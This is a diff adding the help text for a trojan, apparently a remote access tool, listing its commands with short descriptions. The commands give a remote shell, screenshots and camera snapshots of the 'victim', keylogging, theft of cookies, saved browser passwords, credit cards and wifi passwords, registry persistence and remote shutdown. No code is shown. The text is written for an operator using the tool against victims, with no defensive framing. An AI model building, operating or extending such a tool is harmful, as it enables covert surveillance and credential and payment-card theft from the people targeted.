@@ -1,0 +1,53 @@
+
+
+shell
+            Switches your terminal to OS shell terminal.With OS shell terminal,you can execute
+            OS commands and execute added arbitrary commands directly
+
+screenshot  
+            Takes screenshot from victim's computer and saves to /downloads/screenshots
+
+camera_snapshot
+            Takes camera snapshot from victim's camera and saves to /downloads/camera_snapshots
+
+read_keys
+            Returns the keys pressed by the victim since the trojan was run
+
+get_keys
+            Like read_keys command, but saves the keys to /downloads/key_logs
+
+get_cookie <website_name> or get_cookie
+	    Returns saved cookies stated with website_name or returns all saved cookies if no
+	    website_name given
+
+get_browser_cc
+        Returns saved all credit cards
+
+get_browser_pass <website_name> or get_browser_pass
+	    Returns saved passwords stated with website_name or returns all saved passwords if no
+	    website_name given
+
+persistence
+            Adds trojan to registry.With this, when the windows opened, trojan will executed
+
+remove_persistence
+            Removes persistence
+
+get_wifi
+            Returns saved wifi names and passwords from victim's computer
+
+system_info
+            Returns system info from victim's computer
+
+shutdown
+	    Shutdown the victim computer
+
+clear
+            Clears the terminal
+
+help
+            Shows this message
+
+exit
+            Exits from program without losing connection
+
